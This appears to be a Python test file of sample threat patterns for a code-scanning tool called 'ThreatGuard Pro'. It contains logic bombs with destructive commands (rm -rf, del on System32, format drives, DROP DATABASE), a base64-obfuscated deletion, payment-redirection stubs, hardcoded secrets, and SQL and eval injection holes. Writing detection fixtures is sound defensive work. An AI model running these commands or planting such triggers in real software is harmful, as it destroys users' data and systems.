# sample_threats.py - Comprehensive test file for ThreatGuard Pro
# This file contains various threat patterns for testing the enhanced detection system
import datetime
import os
import sys
import subprocess

def time_based_logic_bomb():
    """TIME BOMB - Scheduled Threat Example"""
    # CRITICAL_BOMB: Time-based destructive action
    if datetime.datetime.now() > datetime.datetime(2024, 12, 31):
        # This would trigger on New Year's Day 2025
        os.system("rm -rf /important/data")  # Destructive payload
        print("Time bomb activated - data destroyed!")

def user_targeted_attack():
    """USER BOMB - Targeted Attack Example"""
    # HIGH_RISK: User-specific malicious targeting
    current_user = os.getenv('USER') or os.getenv('USERNAME')
    if current_user == 'admin':
        # Targets specific user
        subprocess.call(['del', '/f', '/s', '/q', 'C:\\Users\\admin\\Documents'], shell=True)
        print(f"User-targeted attack executed against {current_user}")

def execution_counter_bomb():
    """COUNTER BOMB - Execution Trigger Example"""
    # MEDIUM_RISK: Counter-based activation
    global execution_count
    execution_count = getattr(execution_counter_bomb, 'count', 0) + 1
    execution_counter_bomb.count = execution_count
    
    if execution_count > 10:
        # Triggers after 10 executions
        os.remove("critical_system_file.conf")
        print("Counter bomb detonated after 10 executions")

def environment_specific_bomb():
    """SYSTEM BOMB - Environment-Based Threat"""
    # MEDIUM_RISK: System-specific targeting
    import socket
    hostname = socket.gethostname()
    
    if hostname == "production-server":
        # Targets specific production environment
        subprocess.call("format c: /q", shell=True)
        print("Production environment attacked!")

def network_failure_bomb():
    """NETWORK BOMB - Connection-Based Threat"""
    # LOW_RISK: Network dependency trigger
    import urllib.request
    
    try:
        urllib.request.urlopen('http://company-internal.com', timeout=5)
    except:
        # Triggers when network fails
        os.system("rm -rf ./backup_data")
        print("Network failure triggered data deletion")

def financial_fraud_example():
    """FINANCIAL FRAUD - Money Redirection Example"""
    # CRITICAL_BOMB: Unauthorized financial operations
    def process_payment(amount, recipient):
        # Cryptocurrency redirection
        bitcoin_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
        
        # PayPal redirection
        paypal_redirect = "paypal.me/attacker123"
        
        # Crypto wallet address
        crypto_wallet = "0x742d35Cc6634C0532925a3b8D40F4174e3A59339"
        
        # Redirect funds to attacker accounts
        transfer_money(amount * 0.01, bitcoin_address)
        redirect_payment(amount * 0.001, paypal_redirect)
        print(f"Fraudulent transaction: ${amount} redirected")

def destructive_payload_examples():
    """DESTRUCTIVE PAYLOADS - Various Destruction Methods"""
    # CRITICAL_BOMB: Multiple destructive operations
    
    # File system destruction
    import shutil
    shutil.rmtree("/var/log", ignore_errors=True)
    
    # Database destruction
    execute_sql("DROP TABLE users; TRUNCATE TABLE orders;")
    
    # Process termination
    os.system("kill -9 $(ps aux | grep 'important_service' | awk '{print $2}')")
    
    # System formatting (Windows)
    subprocess.call("format D: /q", shell=True)

def hardcoded_secrets_example():
    """SECURITY VULNERABILITY - Hardcoded Secrets"""
    # CRITICAL: Hardcoded sensitive information
    api_key = "sk-1234567890abcdef1234567890abcdef"
    database_password = "super_secret_password_123"
    jwt_secret = "my-jwt-secret-key-that-should-be-in-env"
    
    # Another pattern
    config = {
        'secret_key': 'hardcoded-secret-key-12345',
        'api_token': 'token-abcdef123456789',
        'password': 'admin_password_123'
    }

def sql_injection_vulnerability():
    """SECURITY VULNERABILITY - SQL Injection"""
    # CRITICAL: SQL injection risk
    def get_user_data(user_id):
        query = f"SELECT * FROM users WHERE id = '{user_id}'"
        execute(query)  # Vulnerable to SQL injection
        
    def search_products(search_term):
        sql = f"SELECT * FROM products WHERE name LIKE '%{search_term}%'"
        execute(sql)  # Another SQL injection point

def dangerous_eval_usage():
    """SECURITY VULNERABILITY - Code Injection"""
    # MAJOR: Dangerous eval usage
    user_input = "malicious_code_here"
    result = eval(user_input)  # Extremely dangerous
    
    # Another eval pattern
    expression = "2 + 2"
    calculated = eval(f"result = {expression}")

def advanced_time_bomb_patterns():
    """ADVANCED TIME BOMBS - Various Temporal Triggers"""
    
    # Date-based trigger with destructive payload
    if datetime.date.today() > datetime.date(2024, 6, 1):
        os.system("rm -rf /home/user/important_files")
    
    # Time-based trigger
    current_time = datetime.datetime.now()
    if current_time.hour == 0 and current_time.minute == 0:
        subprocess.call(["del", "/f", "/s", "/q", "C:\\Windows\\System32"], shell=True)
    
    # Calendar-based trigger
    if datetime.datetime.now().month == 12 and datetime.datetime.now().day == 25:
        format_drive("C:")  # Christmas Day surprise attack

def multi_condition_bomb():
    """COMPLEX BOMB - Multiple Trigger Conditions"""
    # CRITICAL_BOMB: Multiple conditions must be met
    user = os.getenv('USER')
    current_date = datetime.datetime.now()
    hostname = os.uname().nodename if hasattr(os, 'uname') else 'unknown'
    
    if (user == 'developer' and 
        current_date > datetime.datetime(2024, 12, 31) and
        hostname == 'dev-machine'):
        
        # Triple-condition logic bomb
        execute_destructive_payload()
        print("Multi-condition logic bomb activated!")

def steganographic_bomb():
    """HIDDEN BOMB - Obfuscated Threat"""
    # HIGH_RISK: Obfuscated malicious code
    import base64
    
    # Base64 encoded destructive command
    hidden_command = "cm0gLXJmIC9pbXBvcnRhbnQvZGF0YQ=="  # "rm -rf /important/data"
    decoded = base64.b64decode(hidden_command).decode()
    
    if datetime.datetime.now().weekday() == 6:  # Sunday
        os.system(decoded)  # Execute hidden command

def polymorphic_threat():
    """POLYMORPHIC THREAT - Self-Modifying Code"""
    # HIGH_RISK: Dynamic threat generation
    threat_variants = [
        "rm -rf /var/log",
        "del /f /s /q C:\\temp",
        "format D: /q",
        "DROP DATABASE production"
    ]
    
    # Select threat based on system time
    threat_index = datetime.datetime.now().second % len(threat_variants)
    selected_threat = threat_variants[threat_index]
    
    if os.getenv('ENVIRONMENT') == 'production':
        exec(f"os.system('{selected_threat}')")

# Helper functions that would be used by the threats
def transfer_money(amount, account):
    """Simulated money transfer function"""
    pass

def redirect_payment(amount, service):
    """Simulated payment redirection"""
    pass

def execute_sql(query):
    """Simulated SQL execution"""
    pass

def execute_destructive_payload():
    """Simulated destructive operations"""
    pass

def format_drive(drive):
    """Simulated drive formatting"""
    pass

def execute(query):
    """Simulated query execution"""
    pass

# Global counter for execution bomb
execution_count = 0

if __name__ == "__main__":
    print("🚨 ThreatGuard Pro Test File - Contains Multiple Threat Patterns")
    print("This file should trigger multiple detections in ThreatGuard Pro:")
    print("  • Time-based logic bombs")
    print("  • User-targeted attacks") 
    print("  • Execution counter bombs")
    print("  • Financial fraud patterns")
    print("  • Destructive payloads")
    print("  • Hardcoded secrets")
    print("  • SQL injection vulnerabilities")
    print("  • Code injection risks")
    print("  • System-specific threats")
    print("  • Network-based triggers")
    print("⚠️ DO NOT EXECUTE - FOR TESTING DETECTION ONLY")
